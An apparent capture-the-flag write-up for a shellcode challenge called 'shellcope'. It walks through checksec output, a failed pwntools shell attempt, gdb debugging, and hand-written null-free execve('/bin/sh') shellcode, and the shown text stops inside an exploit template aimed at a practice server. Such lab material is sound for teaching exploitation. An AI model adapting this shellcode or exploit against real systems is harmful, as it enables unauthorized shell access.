### checksec output
```text
        Arch:       amd64-64-little
        RELRO:      游릭 Full RELRO
        Stack:      游댮 No canary found
        NX:         游릭 NX enabled
        PIE:        游릭 PIE enabled
        SHSTK:      游릭 Enabled
        IBT:        游릭 Enabled
        Stripped:   游댮 No
```
* as we can see, the binary is very secure, it has full RELRO, NX enabled, PIE enabled, SHSTK enabled, and IBT enabled.
* this means that it will be hard to exploit the binary, but not impossible.

```
* the main function is a bit complex, it uses `mmap` to allocate memory for a shellcode, copies the shellcode into the allocated memory, and then calls it.
* the shell code cannot have any null bytes, as it is copied into a buffer that is not null-terminated.


### first exploit attempt
* let's try to exploit the binary by sending a shellcode that spawns a shell.
* we will use pwntools to create the shellcode and send it to the binary. (shellcarft.sh() has no null bytes)
```python
io = start()

io.sendline(asm(shellcraft.sh()))
io.interactive()
```
* the out put looks like this:
```text
[+] Starting local process '/home/omri/dev/pwn-writeups/il/shellcope/shellcope': pid 44596
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ 
[*] Process '/home/omri/dev/pwn-writeups/il/shellcope/shellcope' stopped with exit code -11 (SIGSEGV) (pid 44596)
[*] Got EOF while sending in interactive
```
* we got a segmentation fault, which means that the shellcode is not being executed correctly.
* let's try to debug the binary and see what is going wrong.
### debugging the binary
* we can use gdb to debug the binary and see what is going wrong.
![gdb output](gdb.png)
* as we can see, the payload is not being executed correctly, and the program is crashing at push instruction.
* this is because sp is set to 0x0 so when we try to push we write to address 0x0, which is not allowed.
### Fixing the shellcode
* we can fix this by putting the `/bin/sh` string after the code, this way ther is no need to push anything to the stack.
* we can do this by using the `lea` instruction to load the address of the string into a register, and then use that register to call the `execve` syscall.
* the shellcode will look like this:
```asm
    lea rdi, [rip - 1] /* Get address of "/bin/sh" using RIP-relative and -1 for no nulls*/
    sub rdi, -9 /* Adjust to point to the start of the string  and sub - insted of add + to avoid nulls*/
    mov al, 59           /* execve syscall number */
    syscall
binsh:
    .ascii "/bin/sh\\0"
```
### Final exploit code
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template shellcope
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'shellcope')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('pwnable.co.il', 9001, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
